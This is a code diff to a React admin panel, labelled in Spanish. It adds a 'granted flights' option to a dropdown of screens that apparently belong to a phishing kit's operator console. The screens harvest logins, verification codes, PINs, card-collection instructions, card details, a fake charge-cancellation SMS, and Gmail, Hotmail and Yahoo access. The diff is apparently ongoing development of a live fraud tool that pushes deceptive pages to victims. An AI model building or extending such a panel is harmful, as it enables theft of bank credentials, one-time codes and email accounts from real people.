@@ -964,18 +964,19 @@ export default function AdminPanel() {
                 >
                   <option value="">Selecciona una opción</option>
                   <option value="login">1. Login</option>
-                  <option value="codigo">2. Código de verificación</option>
-                  <option value="nip">3. NIP</option>
-                  <option value="protege">4. Aviso de seguridad</option>
-                  <option value="tarjeta">5. Instrucciones recolección</option>
-                  <option value="cancelacion">6. Cancelación exitosa</option>
-                  <option value="mensaje">7. Ingresa el mensaje que gustes</option>
-                  <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
-                  <option value="gmail">9. Solicitar acceso Gmail</option>
-                  <option value="gmail_verify">10. Verificación Google</option>
-                  <option value="hotmail">11. Solicitar acceso Hotmail</option>
-                  <option value="yahoo">12. Solicitar acceso Yahoo</option>
-                  <option value="datos_tarjeta">13. Ingreso de datos de tarjeta</option>
+                  <option value="vuelos_otorgados">2. Vuelos Otorgados</option>
+                  <option value="codigo">3. Código de verificación</option>
+                  <option value="nip">4. NIP</option>
+                  <option value="protege">5. Aviso de seguridad</option>
+                  <option value="tarjeta">6. Instrucciones recolección</option>
+                  <option value="cancelacion">7. Cancelación exitosa</option>
+                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
+                  <option value="sms_compra">9. SMS Compra - Cancelación de cargo</option>
+                  <option value="gmail">10. Solicitar acceso Gmail</option>
+                  <option value="gmail_verify">11. Verificación Google</option>
+                  <option value="hotmail">12. Solicitar acceso Hotmail</option>
+                  <option value="yahoo">13. Solicitar acceso Yahoo</option>
+                  <option value="datos_tarjeta">14. Ingreso de datos de tarjeta</option>
                 </select>
               </div>
             </div>
